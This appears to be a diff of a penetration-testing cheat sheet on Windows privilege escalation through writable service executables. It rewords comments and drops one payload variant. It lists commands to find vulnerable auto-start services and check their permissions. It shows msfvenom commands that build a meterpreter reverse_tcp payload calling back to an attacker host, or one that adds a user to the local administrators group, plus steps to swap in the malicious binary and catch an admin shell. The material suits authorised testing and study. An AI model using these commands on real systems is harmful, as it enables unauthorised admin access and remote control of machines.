@@ -1,4 +1,4 @@
-# find the affected paths
+# find the affected paths manually
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 
 eg: 
@@ -6,16 +6,16 @@ C:\Program Files\somepath\example.exe is affected
 cd C:\Program Files\somepath\
 icacls example.exe
 
-# Check if you see Everyone:(CI) (F) which means write permission for everyone
+# Check if you can write on this directory (see Everyone:(CI) (F) which means write permission for everyone)
 # Create a payload (one of them given below can be used)
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > example.exe
-msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> prependmigrate=true prependmigrateprocess=explorer.exe -f exe > example.exe
 
-# Upload the malicious exe and replace with the original one
-# Use exploit/multi/handler and get an admin shell
+# Upload the malicious exe and replace as the original one
+# Use exploit/multi/handler and get an admin shell on metasploit
 
 eg2:
+# or you can do the same steps by adding an admin user by creating the following executable 
 msfvenom -p windows/exec CMD='net localgroup administrators <username here> /add' -f exe > example.exe
 
-# or use metasploit module
+# Metasploit module for exploitation:
 trusted_service_path
